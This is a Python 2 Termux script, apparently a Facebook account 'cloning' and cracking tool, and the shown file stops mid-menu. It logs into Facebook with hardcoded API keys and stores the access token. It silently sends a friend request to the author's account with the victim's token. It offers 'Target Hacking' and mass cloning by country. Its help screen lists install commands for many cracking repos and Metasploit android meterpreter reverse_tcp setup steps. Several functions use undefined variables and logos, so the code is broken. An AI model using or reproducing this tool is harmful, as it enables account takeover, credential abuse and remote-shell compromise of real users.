#!/usr/bin/python2
#coding=utf-8
#This Script Is Written By SOMI-TRICKER
  #=================================#
  # SOMI-TRICKER The Official Programmrer  #   #                                 #
  #                                 #
  #=================================#


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')



def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
		
#Dev:Tech-Abm
##### LOGO #####
logo ="""
\033[1;32m⊱• ────────────  ──────────── •⊰
   
\33[1;95m╭━━╮╱╱╱╱╱╱╱╱╱╭━┳━╮╱╱╭━┳╮
\33[1;98m┃╭╮┣┳┳┳━╮╭━┳╮┃┃┃┃┣━╮┃━╋╋━╮
\33[1;97m┃┣┫┃┃┃┃╋╰┫┃┃┃┃┃┃┃┃╋╰┫╭┫┃╋╰╮
\33[1;95m╰╯╰┻━━┻━━┻┻━╯╰┻━┻┻━━┻╯╰┻━━╯
\033[1;32m⊱• ────────────  ──────────── •⊰
\033[1;96m≫ \033[1;96m CODDED BY :\033[1;96m SOMI TRICKER 
\033[1;96m≫ \033[1;96m FACEBOOK:\033[1;94m Anmol x Somi
\033[1;96m≫ \033[1;96m YOUTUBE :\033[1;92m SOMI TRICKER - SA PAKISTANI
\033[1;96m≫ \033[1;96m NOTE :\033[1;95m DONOT  USE WIFI
\033[1;96m≫ \033[1;96m NOTE :\033[1;95m EDITING MY SCRIPT WILL NOT MAKE YOU A CODER
\033[1;96m≫ \033[1;96m NOTE :\033[1;95m HAVING PROBLEM? WHATSAPP ME.
\033[1;96m≫ \033[1;96m Disclamiar :\033[1;95m THIS IS FOR EDUCATIONAL PURPOSE ONLY
\033[1;96m≫ \033[1;96m WARNING [༗]:\033[1;95m I'M NOT RESPONSIBLE FOR ANY ILLEGAL USE 
\033[1;32m⊱• ──────────── ──────────── ────────────•⊰ 


\33[1;97m╭━━━╮╱╱╱╱╭━━━╮
\33[1;91m┃╭━╮┃╱╱╱╱┃╭━╮┃
\33[1;95m┃╰━━╮╭╮╭╮┃┃╱┃┃
\33[1;98m╰━━╮┃╰╋╋╯┃╰━╯┃
\33[1;93m┃╰━╯┃╭╋╋╮┃╭━╮┃
\33[1;95m╰━━━╯╰╯╰╯╰╯╱╰╯

\33[1;95m░█████╗░███╗░░██╗███╗░░░███╗░█████╗░██╗░░░░░  ██╗░░██╗  ░██████╗░█████╗░███╗░░░███╗██╗
\33[1;92m██╔══██╗████╗░██║████╗░████║██╔══██╗██║░░░░░  ╚██╗██╔╝  ██╔════╝██╔══██╗████╗░████║██║
\33[1;97m███████║██╔██╗██║██╔████╔██║██║░░██║██║░░░░░  ░╚███╔╝░  ╚█████╗░██║░░██║██╔████╔██║██║
\33[1;98m██╔══██║██║╚████║██║╚██╔╝██║██║░░██║██║░░░░░  ░██╔██╗░  ░╚═══██╗██║░░██║██║╚██╔╝██║██║
\33[1;91m██║░░██║██║░╚███║██║░╚═╝░██║╚█████╔╝███████╗  ██╔╝╚██╗  ██████╔╝╚█████╔╝██║░╚═╝░██║██║
\33[1;95m╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░░░░╚═╝░╚════╝░╚══════╝  ╚═╝░░╚═╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

\033[1;98m───Game Changer─────
\033[1;32m⊱• ──────────── ──────────── ────────────•⊰"""


##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo11
        print "\033[1;95mÂ«-----------------\033[1;91mDisclaimer\033[1;95m---------------Â»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;95mÂ«-----------------\033[1;91mBlackMafia\033[1;95m---------------Â»"
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;91m1.\x1b[1;96mî‚  Fast Cloning\033[1;92m[New Update]"
        time.sleep(0.05)
	print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;91m2.\x1b[1;93mî‚  Login  Facebook "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;91m3.\x1b[1;95mî‚  Login  Using Token"
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;91m4.\x1b[1;97mî‚  Get Access Token App Fb"
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;93m5.\x1b[1;94mî‚  Awan Mafia  WhatsApp Contact   "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;93m6.\x1b[1;91mî‚  Awan Mafia  Youtube Chenal   "
        time.sleep(0.05)
	print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;91m0.\033[1;91mî‚  Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
		blackmafiax()
	elif peak =="2":
		login1()
        elif peak =="3":
	        tokenz()
        elif peak =="4":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
        elif peak =="5":
		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
	        login()
        elif peak =="6":
	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan(' \033[1;91mWarning î‚  \033[1;92mDo Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning î‚  \033[1;92mUse a New Account To Login' )
		jalan(' \033[1;91mWarning î‚  \033[1;92mTermux All Version Work ' )                 
		print "\033[1;95mÂ«-----------------\033[1;91mAwanMafia\033[1;95m-----------------Â»"
		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[î‚ ] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[î‚ ] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.â€¢â—ˆâ€¢..'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Somi:love_hacker
        time.sleep(0.05)
	print logo2
	print "\033[1;94m    Â«-------\033[1;96mLogged in User Info\033[1;93m----------Â»"
        time.sleep(0.05)
	print "	   \033[1;93m Â«----î‚ Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   \033[1;93m Â«----î‚ ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
        time.sleep(0.05)
	print "\033[1;95mÂ«-----------------\033[1;91mDisclaimer\033[1;95m---------------Â»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;95mÂ«-----------------\033[1;91mAwanMafia\033[1;95m---------------Â»"
        time.sleep(0.05)
	print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92mî‚  Start    Cloning AwanMafia     "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91mî‚  Start    Target  Hacking        "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93mî‚  Facebook Report  AwanMafia      "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95mî‚  Friend's User    information      "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96mî‚  ID Not   Found   Problum solve  "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m6 .\x1b[1;96m\033[1;91mî‚  Awan    Mafia   All Commands  "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m7 .\033[1;96m\033[1;94mî‚  Awan    Mafia   WhatsApp Group   "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m8 .\033[1;96m\033[1;93mî‚  Awan    Mafia   Youtube Chenal   "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m9 .\033[1;96m\033[1;92mî‚  Login    Using   Token          "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m10.\033[1;96m\033[1;91mî‚  Show     Token   login/ID       "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m11.\033[1;96m\033[1;96mî‚  Tool     Rest &  Update         "
        time.sleep(0.05)
	print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91mî‚  logout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		fighter()
        elif unikers =="4":
		asif()
        elif unikers =="5":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="6":
		os.system('clear')
		print logo10
		print "\033[1;95mÂ«-----------------\033[1;91mMessage\033[1;95m---------------Â»"
                jalan('\033[1;92m............Massage..........')
		jalan('\033[1;95mID Not Found Problum Salution Menu 5 Num Option')
                jalan("\033[1;96mTermux  Data Clear Every Day")
                jalan('\033[1;96mCommand Complet  98% ')
                jalan('\033[1;96mCommand Update Every day')
                jalan("\033[1;93m.......All..Command...........")
                jalan('\033[1;91â­•No1â­•')
                jalan('\033[1;96mapt update')
                jalan('\033[1;96mapt upgrade')
                jalan('\033[1;96mpkg install python')
                jalan('\033[1;96mpkg install python2')
                jalan('\033[1;96mpkg install git')
                jalan('\033[1;96mpip2 install requests')
                jalan('\033[1;96mpip2 install mechanize') 
                jalan("\033[1;96mgit clone https://github.com/lovehacker404/World")
                jalan('\033[1;96mcd World')
                jalan('\033[1;96mpython2 Cloning.py')
                jalan('\033[1;96mUser:Awan')
                jalan('\033[1;96mpass:Mafia')
                jalan('\033[1;92mðŸ‘†Copy Command & send 2 groupsðŸ‘†')
                jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
                jalan('\033[1;92mâ­•No2â­•')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
                jalan('\033[1;91mcd WorldCloning')
                jalan('\033[1;91mpython2 World.py')
                jalan('\033[1;91mUser Name : World')
                jalan('\033[1;91mPassword   : lovehacker')
                jalan('\033[1;97mâ­•No3â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Cobra')
                jalan('\033[1;91mcd Cobra')
                jalan('\033[1;91mpython2 Scorpion.py')
                jalan('\033[1;91mUser Name :  Cobra')
                jalan('\033[1;91mPassword: lovehacker')
                jalan('\033[1;96mâ­•No4â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/lov3Hak3r/')
                jalan('\033[1;91mcd lov3Hak3r')
                jalan('\033[1;91mpython2 lovehacker.py')
                jalan('\033[1;95mâ­•No5â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafia2020/')
                jalan('\033[1;91mcd BlackMafia2020')
                jalan('\033[1;91mpython2 lovehacker')
                jalan('\033[1;91mUser Name:Corona')
                jalan('\033[1;91mPassword  :lovehacker')
                jalan('\033[1;94mâ­•No6â­•')
                jalan('\033[1;91mpkg update ')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/CoviD-19/')
                jalan('\033[1;91mcd CoviD-19')
                jalan('\033[1;91mpython2 Virus.py')
                jalan('\033[1;91mUser Name: Corona')
                jalan('\033[1;91mpasword: lovehacker')
                jalan('\033[1;93mâ­•No7â­•')
                jalan('\033[1;91mpkg update ')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python2 ')
                jalan('\033[1;91mpkg install git ')
                jalan('\033[1;91mpip2 install mechanize ')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Dragon/')
                jalan('\033[1;91mcd Dragon')
                jalan('\033[1;91mpython2 lovehacker.py')
                jalan('\033[1;91mUserName:  Dragon')
                jalan('\033[1;91mPassword:  lovehacker')
                jalan('\033[1;92mâ­•No8â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/KaliIndia/')
                jalan('\033[1;91mcd KaliIndia')
                jalan('\033[1;91mpython2 kalilinux.India.py')
                jalan('\033[1;91mUser Name: India')
                jalan('\033[1;91mPassword:lovehacker')
                jalan('\033[1;97mâ­•No9â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Testing')
                jalan('\033[1;91mcd Testing')
                jalan('\033[1;91mpython2 Project.py')
                jalan('\033[1;91mUser Name: Testing')
                jalan('\033[1;91mpasword: lovehacker')
                jalan('\033[1;96mâ­•No10â­•')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Target.Atack/')
                jalan('\033[1;91mcd Target.Atack')
                jalan('\033[1;91mls')
                jalan('\033[1;91mcat README.md')
                jalan('\033[1;91mchmod +x Target.py')
                jalan('\033[1;91mls')
                jalan('\033[1;91mnano password.txt')
                jalan('\033[1;91mls')
                jalan('\033[1;91mpwd')
                jalan('\033[1;91mstorage file location password.txt')
                jalan('\033[1;91mpython2 Target.py')
                jalan('\033[1;95mâ­•No11â­•')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/fblite')
                jalan('\033[1;91mcd fblite')
                jalan('\033[1;91mpython2 Crack.py')
                jalan('\033[1;94mâ­•No12â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/india/')
                jalan('\033[1;91mcd india')
                jalan('\033[1;91mpython2 india.py')
                jalan('\033[1;91mUser name. KashmirBanyGa')
                jalan('\033[1;91mpasword.Pakistan')
                jalan('\033[1;93mâ­•No13â­•')
                jalan('\033[1;91mpkg install python2 ')
                jalan('\033[1;91mpip2 install mechanize ')
                jalan('\033[1;91mpip2 install requests ')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaNew1.12/')
                jalan('\033[1;91mls ')
                jalan('\033[1;91mcd BlackMafiaNew1.12')
                jalan('\033[1;91mpython2 lovehacker')
                jalan('\033[1;91muser name. lovehacker')
                jalan('\033[1;91mpassword . 03094161457')
                jalan('\033[1;92mâ­•No14â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/RedMoonNew/')
                jalan('\033[1;91mcd RedMoonNew')
                jalan('\033[1;91mpython2 lovehacker')
                jalan('\033[1;91mUser Name:: RedMoonNew')
                jalan('\033[1;91mPassword:: lovehacker')
                jalan('\033[1;97mâ­•No15â­•')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mapt install git')
                jalan('\033[1;91mapt install python ')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Install/')
                jalan('\033[1;91mcd Install')
                jalan('\033[1;91mls ')
                jalan('\033[1;91mchmod +x *')
                jalan('\033[1;91mls')
                jalan('\033[1;91mpython all.py')
                jalan('\033[1;96mâ­•No16â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/NetHunting')
                jalan('\033[1;91mcd NetHunting')
                jalan('\033[1;91mpython2 NetHunting.py')
                jalan('\033[1;91mUser Name : linux')
                jalan('\033[1;91mPassword   : lovehacker')
                jalan('\033[1;95mâ­•No17â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
                jalan('\033[1;91mcd WorldCloning')
                jalan('\033[1;91mpython2 World.py')
                jalan('\033[1;91mUser Name : World')
                jalan('\033[1;91mPassword   : lovehacker')
                jalan('\033[1;94mâ­•No18â­•')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BangBang/')
                jalan('\033[1;91mcd BangBang')
                jalan('\033[1;91mpython2 Mafia')
                jalan('\033[1;91mUser Name: Pakistan')
                jalan('\033[1;91mpasword: lovehacker')
                jalan('\033[1;93mâ­•No19â­•')
                jalan('\033[1;91mpkg update ')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python2 ')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mpkg install git ')
                jalan('\033[1;91mpip2 install mechanize ')
                jalan('\033[1;91mpip2 install requests ')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaError')
                jalan('\033[1;91mcd BlackMafiaError')
                jalan('\033[1;91mpython2 Error.py')
                jalan('\033[1;92mâ­•No20â­•')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade -y ')
                jalan('\033[1;91mpkg install python -y ')
                jalan('\033[1;91mgit cloneÂ https://github.com/lovehacker404/Black_Mafia')
                jalan('\033[1;91mcd Black_Mafia')
                jalan('\033[1;91mpython3 Black_Mafia.py')
                jalan('\033[1;91m#Metasploit Commands')
                jalan('\033[1;91mã€‹ã€‹Requirements:-')
                jalan('\033[1;91m1: Termux App (From Playstore)')
                jalan('\033[1;91m2: Good Internet connection  (Must)')
                jalan('\033[1;91m3: 2GB free Storage  (Must)')
                jalan('\033[1;91m4: Android Version 5.0+ (Must)')
                jalan('\033[1;91m5: 4GB+ RAM')
                jalan('\033[1;91m6: Fast Processor')
                jalan('\033[1;91m#installation')
                jalan('\033[1;91m1: pkg update')
                jalan('\033[1;91m2: pkg upgrade')
                jalan('\033[1;91m3: pkg install unstable-repo')
                jalan('\033[1;91m4: pkg install metasploit')
                jalan('\033[1;91m5: msfconsole')
                jalan('\033[1;91m6: use exploit/multi/handler')
                jalan('\033[1;91m7: set payload android/meterpreter/reverse_tcp ')
                jalan('\033[1;91m8: set lhost ')
                jalan('\033[1;91m9: set lport 8080')
                jalan('\033[1;91m10: exploit')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
        elif unikers =="7":
		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
	        menu()
        elif unikers =="8":
	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
	        menu()
        elif unikers =="9":
		tokenz()
        elif unikers =="10":
		os.system('reset')
		print logo14
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print logo6
		print "\033[1;95mÂ«-----------------\033[1;91mDataReset\033[1;95m---------------Â»"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo26
	print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m1 .\x1b[1;95mî‚  Start Cloning Pakistan       "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m2 .\x1b[1;95mî‚  Start Cloning India          "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m3 .\x1b[1;95mî‚  Start Cloning Indonasia      "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m4 .\x1b[1;95mî‚  Start Cloning United State   "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m5 .\x1b[1;95mî‚  Start Cloning Bangladash     "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m6 .\x1b[1;95mî‚  Start Cloning All Country    "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m7 .\033[1;95mî‚  Start Cloning Indian Old     "
        time.sleep(0.05)
